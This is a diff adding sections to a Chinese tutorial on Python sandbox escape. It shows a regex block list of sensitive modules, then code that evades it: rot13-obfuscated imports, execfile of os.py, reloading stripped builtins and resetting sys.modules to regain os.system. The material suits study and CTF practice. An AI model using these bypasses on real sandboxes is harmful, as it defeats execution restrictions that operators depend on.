@@ -34,10 +34,7 @@ python中对一个变量应用```__class__```方法能从一个变量实例转�
 
 ```__globals__```: 该属性是函数特有的属性，记录当前文件全局变量的值，如果某个文件调用了os、sys等库，但我们只能访问该文件某个函数或者某个对象，那么我们就可以利用globals属性访问全局的变量。该属性保存的是函数全局变量的字典引用。
 
-````__getattribute__```: 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
-
-## import相关的基础
-
+```__getattribute__```: 实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
 
 ## 支持命令执行的python库
 ```python
@@ -73,6 +70,85 @@ system('ls')
 ```
 其中，open和read函数对于读取python沙盒中的文件以及编写一些可以绕过沙盒执行的代码非常有用。
 
+## 沙盒逃匿思想
+核心就是那几个魔术方法像是__mro__,```__base__```,这两个意思都是寻找父类，然后找到<type 'object'>(python2)或是<class 'object'>(python3)，然后寻找其子类，再去找命令执行或是文件读取的模块。
+## **import相关**
+对于防御者来说，最基础的思路，就是对代码的内容进行检查，最常见的方法呢，就是禁止引入敏感的包
+```python
+import re
+code = open('code.py').read()
+pattern  = re.compile('import\s+(os|commands|subprocess|sys)')
+match = re.search(pattern,code)
+if match:
+    print "forbidden module import detected"
+    raise Exception
+```
+用以上的几行代码，就可以简单的完成对于敏感的包的检测，我们知道要执行shell命令必须引入 os/commands/subprocess这几个包，对于攻击者来说该如何绕过呢，必须使用其他的引入方式
+ * 1. import 关键字
+ * 2. __import__函数
+ * 3. importlib库
+
+import 是一个关键字，因此，包的名字是直接以'tag'(标记)的方式引入的，但是对于函数和包来说，引入包的名字就是他们的参数，也就是说，将会以字符串的方式引入，我们可以对原始关键字做出种种处理来bypass掉源码扫描。
+以__import__函数举例：
+```python
+f3ck = __import__("pbzznaqf".decode('rot_13'))
+print f3ck.getoutput('ifconfig')
+```
+```python
+#或者使用importlib 这一个库
+import importlib
+f3ck = importlib.import_module("pbzznaqf".decode('rot_13')
+print f3ck.getoutput('ifconfig')
+```
+使用execfile：
+```python
+#pytho2
+execfile('/usr/lib/python2.7/os.py')
+system('ls')
+#python3
+with open('/usr/lib/python3.6/os.py','r') as f:
+    exec(f.read())
+system('ls')
+```
+```python
+import sys
+sys.modules['os']='/usr/lib/python2.7/os.py'
+import os
+```
+## **```__builtins__```**
+刚才的__import__函数同样也是一个builtin函数，常用的危险函数eval,exec,execfile也是__builtin__的
+但是，有的时候你通过上述两种方式无法找到该模块，dir也不行。上述方法能够生效的前提是，在最开始有这样的程序语句import __builtin__，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。
+如果把这些函数从__builtin__中删除,那么就不能够再直接使用了，解决办法：
+```python
+reload(__builtin__) #就可以重新得到完整的__builtin__模块了
+# 但是reload也是__builtin__下面的函数，如果直接把它干掉，就没办法重新引入了，这个时候,我们该怎么呢
+# 在python中,有一个模块叫做imp，然后我们就会重新得到完整的__builtin__模块了
+import imp
+imp.reload(__builtin__)
+````
+## **sys.modules**
+sys.modules 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 os 是默认被加载进来的，但是不能直接使用，原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。
+
+如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：
+```python
+>>> sys.modules['os'] = 'not allowed'
+>>> import os
+>>> os.system('ls')
+Traceback (most recent call last):
+  File "<stdin>", line 1, in <module>
+AttributeError: 'str' object has no attribute 'system'
+>>>
+```
+解决办法是删了sys.modules['os']，会让Python重新加载一次os
+```python
+del sys.modules['os']
+import os
+os.system('ls')
+# 或者
+execfile('/usr/lib/python2.7/os.py')
+system('ls')
+```
+## 参考资料
 【Escaping the Python Sandbox】https://zolmeister.com/2013/05/escaping-python-sandbox.html<br>
 【Sandbox Escape with Python】https://prog.world/sandbox-escape-with-python/<br>
 【】http://www.secwk.com/2019/10/17/11283/<br>
